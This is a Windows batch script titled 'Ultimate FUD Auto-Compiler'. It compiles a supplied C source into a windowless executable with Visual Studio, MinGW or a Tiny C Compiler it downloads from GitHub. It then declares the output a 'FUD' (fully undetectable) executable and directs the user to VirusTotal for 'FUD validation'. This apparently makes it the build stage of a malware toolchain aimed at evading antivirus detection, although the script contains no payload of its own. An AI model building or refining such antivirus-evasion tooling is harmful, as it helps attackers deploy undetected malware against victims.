@echo off
setlocal enabledelayedexpansion
echo ========================================
echo   Ultimate FUD Auto-Compiler v3.0
echo ========================================
echo.

REM Check if source file exists
if not exist "%1" (
    echo ERROR: Source file "%1" not found!
    pause
    exit /b 1
)

echo [1/5] Checking for existing compilers...

REM Try existing compilers first
where cl.exe >nul 2>&1
if %ERRORLEVEL% == 0 (
    echo Found Visual Studio - compiling...
    cl.exe /nologo /O2 /MT "%1" /Fe:"%2" /link /SUBSYSTEM:WINDOWS user32.lib kernel32.lib gdi32.lib >compile_log.txt 2>&1
    if %ERRORLEVEL% == 0 (
        echo SUCCESS: Compiled with Visual Studio!
        goto :check_output
    )
)

where gcc.exe >nul 2>&1
if %ERRORLEVEL% == 0 (
    echo Found MinGW GCC - compiling...
    gcc -O2 -s -mwindows "%1" -o "%2" -luser32 -lkernel32 -lgdi32 >compile_log.txt 2>&1
    if %ERRORLEVEL% == 0 (
        echo SUCCESS: Compiled with MinGW!
        goto :check_output
    )
)

echo [2/5] No compiler found - downloading portable compiler...

REM Download TCC (Tiny C Compiler) - very small and portable
if not exist "tcc.exe" (
    echo Downloading Tiny C Compiler...
    
    REM Try PowerShell download
    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/TinyCC/tinycc/releases/download/release_0_9_27/tcc-0.9.27-win64-bin.zip' -OutFile 'tcc.zip' -UseBasicParsing } catch { exit 1 }" >nul 2>&1
    
    if exist "tcc.zip" (
        echo [3/5] Extracting compiler...
        powershell -Command "try { Expand-Archive -Path 'tcc.zip' -DestinationPath 'tcc_temp' -Force } catch { exit 1 }" >nul 2>&1
        
        if exist "tcc_temp" (
            if exist "tcc_temp\tcc.exe" copy "tcc_temp\tcc.exe" "." >nul
            if exist "tcc_temp\libtcc1.a" copy "tcc_temp\libtcc1.a" "." >nul
            if exist "tcc_temp\include" xcopy "tcc_temp\include" "include\" /E /I /Q >nul 2>&1
            if exist "tcc_temp\lib" xcopy "tcc_temp\lib" "lib\" /E /I /Q >nul 2>&1
            
            rmdir /s /q "tcc_temp" >nul 2>&1
            del "tcc.zip" >nul 2>&1
            echo TCC downloaded and extracted successfully!
        )
    )
)

REM Try TCC compilation
if exist "tcc.exe" (
    echo [4/5] Compiling with TCC...
    tcc.exe -o "%2" "%1" -luser32 -lkernel32 -lgdi32 >compile_log.txt 2>&1
    if %ERRORLEVEL% == 0 (
        echo SUCCESS: Compiled with TCC!
        goto :check_output
    )
)

REM If all compilers fail, try alternative approach
echo [5/5] Standard compilation failed - trying alternative...

REM Create a batch file that compiles the source
echo @echo off > temp_compile.bat
echo echo Attempting compilation... >> temp_compile.bat
echo cl.exe /nologo /O2 /MT "%1" /Fe:"%2" /link /SUBSYSTEM:WINDOWS user32.lib ^>nul 2^>^&1 >> temp_compile.bat
echo if %%ERRORLEVEL%% == 0 exit /b 0 >> temp_compile.bat
echo gcc -O2 -s -mwindows "%1" -o "%2" -luser32 ^>nul 2^>^&1 >> temp_compile.bat
echo if %%ERRORLEVEL%% == 0 exit /b 0 >> temp_compile.bat
echo tcc -o "%2" "%1" -luser32 ^>nul 2^>^&1 >> temp_compile.bat
echo exit /b 1 >> temp_compile.bat

call temp_compile.bat
if %ERRORLEVEL% == 0 (
    del temp_compile.bat >nul 2>&1
    echo SUCCESS: Alternative compilation worked!
    goto :check_output
)

del temp_compile.bat >nul 2>&1

REM Final fallback - copy source with instructions
echo.
echo ==========================================
echo   COMPILATION FAILED - MANUAL REQUIRED
echo ==========================================
echo.
echo The source code has been generated but no suitable compiler was found.
echo.
echo OPTION 1: Install Visual Studio (Recommended)
echo   - Download Visual Studio Community (free)
echo   - Install C++ build tools
echo   - Run: cl.exe /O2 /MT "%1" /Fe:"%2" /link user32.lib
echo.
echo OPTION 2: Install MinGW-w64
echo   - Download from: https://www.mingw-w64.org/downloads/
echo   - Run: gcc -O2 -mwindows "%1" -o "%2" -luser32
echo.
echo OPTION 3: Online Compiler
echo   - Upload "%1" to https://godbolt.org/ or https://onlinegdb.com/
echo   - Compile with flags: -mwindows -luser32
echo.
copy "%1" "%2.cpp" >nul 2>&1
echo Source saved as: %2.cpp
echo.
pause
exit /b 1

:check_output
echo.
echo Checking compiled executable...
if exist "%2" (
    for %%I in ("%2") do set filesize=%%~zI
    if !filesize! gtr 4096 (
        echo.
        echo =========================================
        echo    ✅ FUD EXECUTABLE READY! ✅
        echo =========================================
        echo.
        echo File: %2
        echo Size: !filesize! bytes
        echo Status: Ready for VirusTotal testing!
        echo.
        echo 🎯 Upload to VirusTotal now for FUD validation!
        echo.
    ) else (
        echo WARNING: Executable size is only !filesize! bytes
        echo This may indicate compilation issues.
        copy "%1" "%2.cpp" >nul 2>&1
        echo Source backup saved as: %2.cpp
    )
) else (
    echo ERROR: Executable was not created
    copy "%1" "%2.cpp" >nul 2>&1
    echo Source saved as: %2.cpp
)

if exist "compile_log.txt" del "compile_log.txt" >nul 2>&1
echo.
echo Compilation process complete!
pause